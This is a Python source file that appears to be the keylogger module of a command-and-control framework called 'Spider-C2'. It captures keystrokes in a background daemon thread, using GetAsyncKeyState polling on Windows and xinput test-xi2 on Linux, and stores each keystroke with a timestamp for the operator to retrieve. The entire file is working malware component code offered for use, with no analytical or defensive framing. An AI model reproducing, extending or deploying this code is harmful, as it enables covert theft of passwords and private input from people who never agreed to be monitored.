"""
Spider-C2 Module : Keylogger
Keyboard input capture for agent systems.
"""

import platform
import threading
from datetime import datetime

class KeyloggerModule:
    def __init__(self):
        self.os_type = platform.system()
        self.log = []
        self.running = False
        self.thread = None

    def start(self):
        if self.running:
            return "[!] Keylogger already running"
        self.running = True
        if self.os_type == "Windows":
            self.thread = threading.Thread(target=self._keylogger_windows)
        elif self.os_type == "Linux":
            self.thread = threading.Thread(target=self._keylogger_linux)
        else:
            return "[!] Unsupported OS for keylogger"
        self.thread.daemon = True
        self.thread.start()
        return "[+] Keylogger started"

    def stop(self):
        self.running = False
        return f"[+] Keylogger stopped. {len(self.log)} keystrokes captured."

    def get_logs(self):
        return "\n".join(self.log)

    def _keylogger_windows(self):
        try:
            import win32api
            import win32console
            win = win32console.GetConsoleWindow()
            while self.running:
                for i in range(32, 127):
                    if win32api.GetAsyncKeyState(i) & 0x0001:
                        self.log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {chr(i)}")
        except ImportError:
            self.log.append("[!] pywin32 not installed")

    def _keylogger_linux(self):
        try:
            import subprocess
            process = subprocess.Popen(["xinput", "test-xi2", "--root"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while self.running:
                line = process.stdout.readline()
                if line:
                    self.log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {line.decode().strip()}")
        except:
            self.log.append("[!] xinput not available")
